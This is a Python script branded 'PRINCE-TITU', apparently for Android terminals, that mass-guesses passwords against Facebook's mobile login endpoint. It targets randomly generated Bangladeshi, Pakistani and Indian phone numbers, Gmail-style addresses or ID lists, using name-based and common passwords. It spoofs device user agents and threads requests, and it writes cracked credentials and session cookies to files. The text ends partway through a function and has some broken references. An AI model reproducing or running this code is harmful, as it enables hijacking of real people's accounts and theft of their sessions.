#coding=utf-8
import os,sys,platform
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
import os,sys,time,json,random,re,string,platform,base64,uuid,zlib,subprocess,requests
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from datetime import datetime
from datetime import date
from time import sleep
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
G='\x1b[1;92m'
R='\x1b[1;91m'
W='\x1b[1;97m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
yp ='\x1b[1;95m'
mys = '\x1b[0m' 
###---[ SUBPROCESS ]---###
os.system('clear')
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
sim_id=''
fbsv = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
loop = 0
oks=[]
cps=[]
twf=[]
id=[]
ugen=[]
scoki=[]
ugen2=[]
methods=[]
android_models=[]
sys.stdout.write('\x1b]2; PRINCE-TITU\x07')
try:os.mkdir('/sdcard/PRINCE-IDS')
except:pass
time.sleep(0.1)
for xu in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' SM-G960U'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,110)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='Linux; Android 7.1.2; Redmi 4A)'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile Safari/E7FBAF'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    ugen.append(uak)

for i in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    l='Mobile Safari/537.36'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

for i in range(10000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku2 = str(rc([satu,dua,tiga,empat]))
    ugen.append(uaku2)

def randus():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    vapp = random.randint(410000000,499999999)
    ccr = '[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07,width=1080,height=2460};FBLC/en_US;FBCR/Freenet;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;] '
    ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; TECNO KE7 Build/{random.randint(111111,999999)}.{random.randint(111,999)}) "+ccr
    return ua

def randfng():
    ffr = '[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SGH-I747;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]'
    ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SAMSUNG-SGH-I747 Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) "+ffr
    return ua
logo= '''\033[1;97m
       \033[1;97m┏━━━┓┏━━━┓┏━━┓┏━┓ ┏┓┏━━━┓┏━━━┓
       \033[1;97m┃┏━┓┃┃┏━┓┃┗┫┣┛┃ ┗┓┃┃┃┏━┓┃┃┏━━┛
       \033[1;92m┃┗━┛┃┃┗━┛┃ ┃┃ ┃┏┓┗┛┃┃┃ ┗┛┃┗━━┓
       \033[1;92m┃┏━━┛┃┏┓┏┛ ┃┃ ┃┃┗┓┃┃┃┃ ┏┓┃┏━━┛
       \033[1;97m┃┃   ┃┃┃┗┓┏┫┣┓┃┃ ┃┃┃┃┗━┛┃┃┗━━┓
       \033[1;97m┗┛   ┗┛┗━┛┗━━┛┗┛ ┗━┛┗━━━┛┗━━━┛
─────────────────────────────────────────────
\033[1;97m (\033[1;92m*\033[1;97m) Developer : Prince-Titu
\033[1;97m (\033[1;92m*\033[1;97m) Tool Type : Clonnig Tools
\033[1;97m (\033[1;92m*\033[1;97m) Version   : 0.1
─────────────────────────────────────────────'''
loop = 0
ok = []
cp = []
methods = []
total=[]
def main():
    os.system('clear')
    print(logo)
    print('\033[1;97m (\033[1;92m1\033[1;97m) File Cloning')
    print('\033[1;97m (\033[1;92m2\033[1;97m) Random cloning')
    print('\033[1;97m (\033[1;92m3\033[1;97m) Check Live ids')
    print(45*'─')
    menu_opt = input('\033[1;97m (\033[1;92m?\033[1;97m) Select menu: ')
    if menu_opt =='1':
        method_crack()
    elif menu_opt in ['2','02']:
        rands()
    elif menu_opt in ['3','03']:
        os.system('clear')
    elif menu_opt in ['4','04']:
        bd()
    else:
        print('\n Invalid option, try again ...')
        time.sleep(1)
        main()
def method_crack():
    global methods
    os.system('clear')
    print(logo)
    print('\033[1;97m (\033[1;92m1\033[1;97m) Method (\033[1;92mmix ids\033[1;97m)')
    print('\033[1;97m (\033[1;92m2\033[1;97m) Method (\033[1;92mmix ids\033[1;97m)')
    print(45*'─')
    me_opt = input('\033[1;97m (\033[1;92m*\033[1;97m) Select method: ')
    if me_opt =='1':
        os.system('clear')
        methods.append('m1')
        crack_main().crack(id)
    elif me_opt =='2':
        os.system('clear')
        methods.append('m2')
        crack_main().crack(id)
class crack_main():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        os.system('clear');print(logo)
        hshs = input('\033[1;97m (\033[1;92m?\033[1;97m) You want to show cookies (y/n): ')
        if hshs in ["y","yes","Yes","Y"]:scoki.append("yes")
        else:scoki.append("no")
        os.system('clear')
        print(logo)
        self.file = input('\033[1;97m (\033[1;92m*\033[1;97m) File path : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(' No file found ....')
            main()

    def m1(self,iid,name,passlist):
        try:
            global ok,loop
            sys.stdout.write(f"\r\033[1;97m [PRINCE-M1] %s|\033[1;92mOK:-%s\033[1;97m"%(loop,len(ok)));sys.stdout.flush()
            fn = name.split(' ')[0]
            try:
                ln = name.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                ses = requests.Session()
                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                fbbv = str(random.randint(000000000,999999999))
                tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
                accessToken = random.choice(tokenlist)
                fblc = "hi_IN"
                fban = random.choice(['FB4A','Orca-Android','EMA'])
                fbpn = random.choice(['com.facebook.orca','com.facebook.katana'])
                ua = 'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBCR/'+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+'.0.1;FBCA/'+fbca+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
                data={
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': iid,
                    'password': pas,
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'hi_IN',
                    'client_country_code': 'IN',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                head={
                    'User-Agent': ua,
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
                if 'session_key' in po:
                    if "yes" in scoki:
                        ckkk = ";".join(i["name"]+"="+i["value"] for i in rr["session_cookies"])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                        coki = f"sb={ssbb};{ckkk}"
                        print('\r\033[1;92m [PRINCE-OK] '+iid+' | '+pas+'\n\033[0;97m')
                        print('\r\033[1;93m [COOKIE-ID]\033[1;92m '+coki+'\n\033[1;97m')
                        open('/sdcard/prince-ids/file-ok.txt','a').write(iid+'|'+pas+'|'+coki+'\n')
                        ok.append(iid)
                        break
                    else:
                        print('\r\033[1;92m [PRINCE-OK] '+iid+' | '+pas+'\033[0;97m')
                        open('/sdcard/prince-ids/file-ok.txt','a').write(iid+'|'+pas+'|'+coki+'\n')
                        ok.append(iid)
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    open('/sdcard/prince-ids/file-cp.txt','a').write(iid+'|'+pas+'\n')
                    cp.append(iid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(31)

    def m2(self,iid,name,passlist):
        try:
            global ok,loop
            sys.stdout.write(f"\r\033[1;97m [PRINCE-M2] %s|\033[1;92mOK:-%s\033[1;97m"%(loop,len(ok)));sys.stdout.flush()
            fn = name.split(' ')[0]
            try:
                ln = name.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                ses = requests.Session()
                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                fbbv = str(random.randint(000000000,999999999))
                tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
                accessToken = random.choice(tokenlist)
                fblc = "en_US"
                fban = random.choice(['FB4A','Orca-Android'])
                fbpn = random.choice(['com.facebook.orca','com.facebook.katana'])
                ua = 'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBCR/'+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+'.0.1;FBCA/'+fbca+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
                data={
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': iid,
                    'password': pas,
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                head={
                    'User-Agent': ua,
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
                if 'session_key' in po:
                    if "yes" in scoki:
                        ckkk = ";".join(i["name"]+"="+i["value"] for i in rr["session_cookies"])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                        coki = f"sb={ssbb};{ckkk}"
                        print('\r\033[1;92m [PRINCE-OK] '+iid+' | '+pas+'\n\033[0;97m')
                        print('\r\033[1;93m [COOKIE-ID]\033[1;92m '+coki+'\n\033[1;97m')
                        open('/sdcard/PRINCE-IDS/UID-OK.txt','a').write(iid+'|'+pas+'|'+coki+'\n')
                        ok.append(iid)
                        break
                    else:
                        print('\r\033[1;92m [PRINCE-OK] '+iid+' | '+pas+'\033[0;97m')
                        open('/sdcard/PRINCE-IDS/UID-OK.txt','a').write(iid+'|'+pas+'\n')
                        ok.append(iid)
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    open('/sdcard/PRINCE-IDS/UID-CP.txt','a').write(iid+'|'+pas+'\n')
                    cp.append(iid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(31)

    def pasw(self):
        passlist = []
        os.system('clear')
        print(logo)
        print('\033[1;97m (\033[1;92m*\033[1;97m) Example : \033[1;92mfirst last,First last,first123\033[0;97m')
        print(45*'─')
        pl = int(input(f'\033[1;97m (\033[1;92m*\033[1;97m) Password Limit: '))
        os.system('clear');print(logo)
        print('\033[1;97m (\033[1;92m*\033[1;97m) Example : \033[1;92mfirst last,First last,first123\033[0;97m')
        print(45*'─')
        if pl =='':
            print('\n Put limit between 1 to 100')
            time.sleep(1)
            passw(self)
        elif pl > 100:
            print('\ Password limit should not be greater than 100')
            time.sleep(1)
            passw(self)
        else:
            for cd in range(pl):
                passlist.append(input(f'\033[1;97m (\033[1;92m{cd+1}\033[1;97m) Put password: '))
        os.system('clear')
        print(logo)
        print('\033[1;97m (\033[1;92m*\033[1;97m) Total Ids : \033[1;92m'+str(len(self.id))+'\033[1;97m')
        print('\033[1;97m (\033[1;92m*\033[1;97m) Ids Saved Folder Name \033[1;97m(\033[1;92mPRINCE-IDS\033[1;97m)')
        print(45*'─')
        print('\033[1;91m        Change IP & Apn If No Result\033[1;97m')
        print(45*'─')
        with ThreadPool(max_workers=30) as formSubmit:
            for user in self.id:
                iid,name = user.split('|')
                if 'm1' in methods:
                    formSubmit.submit(self.m1,iid,name,passlist)
                elif 'm2' in methods:
                    formSubmit.submit(self.m2,iid,name,passlist)
                else:
                    print(' Internal script error, please contact to author')
                    exit()
        print("\033[1;97m")
        print(45*'─')
        print(' The process has been completed')
        print(' Total OK: '+str(len(ok)))
        print(45*'─')
        input('\n Press enter to back ')
        main()

def rands():
    os.system('clear');print(logo)
    print('\033[1;97m (\033[1;92m1\033[1;97m) Number Clone (bd)')
    print('\033[1;97m (\033[1;92m2\033[1;97m) Number Clone (pk)')
    print('\033[1;97m (\033[1;92m3\033[1;97m) Number Clone (india)')
    print('\033[1;97m (\033[1;92m4\033[1;97m) Gmail  Clonnig')
    print(45*'─')
    rnd_opt = input('\033[1;97m (\033[1;92m?\033[1;97m) Select country: ')
    if rnd_opt in ['1','01']:
        bd()
    elif rnd_opt in ['2','02']:
        pak()
    elif rnd_opt in ['3','03']:
        ind()
    elif rnd_opt in ['4','04']:
        gml()
    else:
        print('\n Invalid option, try again ...')
        time.sleep(1)
        rands()

def pak():
                user=[]
                os.system('clear');print(logo)
                kaaa = input('\033[1;97m (\033[1;92m?\033[1;97m) You want to show cookies (y/n): ')
                if kaaa in ["y","yes","Yes","Y"]:scoki.append("yes")
                else:scoki.append("no")
                os.system('clear');print(logo)
                print('\033[1;97m (\033[1;92m*\033[1;97m) Example Code : \033[1;92m0306,0300,0330,0315\033[1;97m')
                print(45*'─')
                code = input('\033[1;97m (\033[1;92m+\033[1;97m) Put Code: ')
                try:
                        os.system('clear');print(logo)
                        print('\033[1;97m (\033[1;92m*\033[1;97m) Example : \033[1;92m5000, 10000, 30000, 50000\033[1;97m')
                        print(45*'─')
                        limit = int(input('\033[1;97m (\033[1;92m+\033[1;97m) Put Limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with ThreadPool(max_workers=30) as alx:     
                        os.system('clear')
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print('\033[1;97m (\033[1;92m*\033[1;97m) Total Ids : \033[1;92m'+tl+'\033[1;97m')
                        print('\033[1;97m (\033[1;92m*\033[1;97m) Ids Saved Folder Name \033[1;97m(\033[1;92mPRINCE-IDS\033[1;97m)')
                        print(45*'─')
                        print('\033[1;91m        Change IP & Apn If No Result\033[1;97m')
                        print(45*'─')
                        for psx in user:
                                ids = code+psx
                                last6 = psx[:6]
                                passlist = [psx,ids,last6,'786786','i love you','khankhan']
                                alx.submit(rndm,ids,passlist,tl)
                print('\033[1;97m')
                print(45*'─')
                print(' The process has completed')
                print(' Total OK : '+str(len(oks)))
                print(45*'─')
                input(' Press enter to back ')
                main()

def ind():
                user=[]
                os.system('clear');print(logo)
                kaaa = input('\033[1;97m (\033[1;92m?\033[1;97m) You want to show cookies (y/n): ')
                if kaaa in ["y","yes","Yes","Y"]:scoki.append("yes")
                else:scoki.append("no")
                os.system('clear');print(logo)
                print('\033[1;97m (\033[1;92m*\033[1;97m) Example Code : \033[1;92m+9163,+9183,+9194,+9196,+9178\033[1;97m')
                print(45*'─')
                code = input('\033[1;97m (\033[1;92m+\033[1;97m) Put Code: ')
                try:
                        os.system('clear');print(logo)
                        print('\033[1;97m (\033[1;92m*\033[1;97m) Example : \033[1;92m5000, 10000, 30000, 50000\033[1;97m')
                        print(45*'─')
                        limit = int(input('\033[1;97m (\033[1;92m+\033[1;97m) Put Limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with ThreadPool(max_workers=30) as alx:     
                        os.system('clear')
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print('\033[1;97m (\033[1;92m*\033[1;97m) Total Ids : \033[1;92m'+tl+'\033[1;97m')
                        print('\033[1;97m (\033[1;92m*\033[1;97m) Ids Saved Folder Name \033[1;97m(\033[1;92mPRINCE-IDS\033[1;97m)')
                        print(45*'─')
                        print('\033[1;91m        Change IP & Apn If No Result\033[1;97m')
                        print(45*'─')
                        for psx in user:
                                ids = code+psx
                                passlist = ['57273200','59039200']
                                alx.submit(rndm,ids,passlist,tl)
                print("\033[1;97m")
                print(45*'─')
                print(' The process has completed')
                print(' Total OK : '+str(len(oks)))
                print(45*'─')
                input(' Press enter to back ')
                main()

def bd():
                user=[]
                os.system('clear');print(logo)
                kaaa = input('\033[1;97m (\033[1;92m?\033[1;97m) You want to show cookies (y/n): ')
                if kaaa in ["y","yes","Yes","Y"]:scoki.append("yes")
                else:scoki.append("no")
                os.system('clear');print(logo)
                print('\033[1;97m (\033[1;92m*\033[1;97m) Example Code : \033[1;92m015,016,017,018,019\033[1;97m')
                print(45*'─')
                code = input('\033[1;97m (\033[1;92m+\033[1;97m) Put Code: ')
                try:
                        os.system('clear');print(logo)
                        print('\033[1;97m (\033[1;92m*\033[1;97m) Example : \033[1;92m5000, 10000, 30000, 50000\033[1;97m')
                        print(45*'─')
                        limit = int(input('\033[1;97m (\033[1;92m+\033[1;97m) Put Limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with ThreadPool(max_workers=30) as alx:     
                        os.system('clear')
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print('\033[1;97m (\033[1;92m*\033[1;97m) Total Ids : \033[1;92m'+tl+'\033[1;97m')
                        print('\033[1;97m (\033[1;92m*\033[1;97m) Ids Saved Folder Name \033[1;97m(\033[1;92mPRINCE-IDS\033[1;97m)')
                        print(45*'─')
                        print('\033[1;91m        Change IP & Apn If No Result\033[1;97m')
                        print(45*'─')
                        for psx in user:
                                ids = code+psx
                                first6 = ids[:6]
                                last6 = psx[:6]
                                last7 = psx[:7]
                                passlist = [psx,ids,first6,last6,last7,'bangladesh','i love you','khankhan']
                                alx.submit(rndm,ids,passlist,tl)
                print('\033[1;97m')
                print(45*'─')
                print(' The process has completed')
                print(' Total OK : '+str(len(oks)))
                print(45*'─')
                input(' Press enter to back ')
                main()

def gml():
    user_ID=[]
    kaaa = input('\033[1;97m (\033[1;92m?\033[1;97m) You want to show cookies (y/n): ')
    if kaaa in ["y","yes","Yes","Y"]:scoki.append("yes")
    else:scoki.append("no")
    os.system('clear');print(logo)
    print('\033[1;97m (\033[1;92m*\033[1;97m) Example:\033[1;92mamir khan,sakib khan,ayesha begum\033[1;97m')
    print(45*'─')
    code = input(f"\033[1;97m (\033[1;92m*\033[1;97m) Fast Name : ")
    kode = input(f"\033[1;97m (\033[1;92m*\033[1;97m) Last Name : ")
    try:
        os.system('clear');print(logo)
        print('\033[1;97m (\033[1;92m*\033[1;97m) Example : \033[1;92m5000, 10000, 30000, 50000\033[1;97m')
        print(45*'─')
        limit = int(input('\033[1;97m (\033[1;92m+\033[1;97m) Put Limit: '))
    except ValueError:
        limit = 5000
    for i in range(limit):
        user_ID.append(str(random.randint(1, 999)))
    passlist = [code,kode,code+'123',code+'1234',code+'12345',code+kode,code+' '+kode,'bangladesh','i love you','@#@#@#','123890']
    with ThreadPool(max_workers=70) as alx:
        tl = str(len(user_ID))
        os.system('clear');print(logo)
        print('\033[1;97m (\033[1;92m*\033[1;97m) Total Ids : \033[1;92m'+tl+'\033[1;97m')
        print('\033[1;97m (\033[1;92m*\033[1;97m) Ids Saved Folder Name \033[1;97m(\033[1;92mPRINCE-IDS\033[1;97m)')
        print(45*'─')
        print('\033[1;91m        Change IP & Apn If No Result\033[1;97m')
        print(45*'─')
        for user in user_ID:
            ids = code+kode+user+'@gmail.com'
            alx.submit(rndm,ids,passlist,tl)
    print("\033[1;97m")
    print(45*'─')
    print(' The process has completed')
    print(' Total OK : '+str(len(oks)))
    print(45*'─')
    input(' Press enter to back ')
    main()

def rndm(ids,passlist,tl):
    try:
        global oks,twf,loop
        sys.stdout.write(f"\r\033[1;97m [PRINCE] \033[1;97m%s\033[1;97m|\033[1;92mOK:-%s\033[1;97m"%(loop,len(oks)));sys.stdout.flush()
        for ps in passlist:
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            fblc = "en_GB"
            fbcr = "Airtel"
            fban = random.choice(['FB4A','Orca-Android','EMA'])
            fbpn = random.choice(['com.facebook.orca','com.facebook.katana'])
            ua = 'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+'.0.1;FBCA/'+fbca+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
            head = {'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown','User-Agent': ranmaf(),'Accept-Encoding': 'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger',}
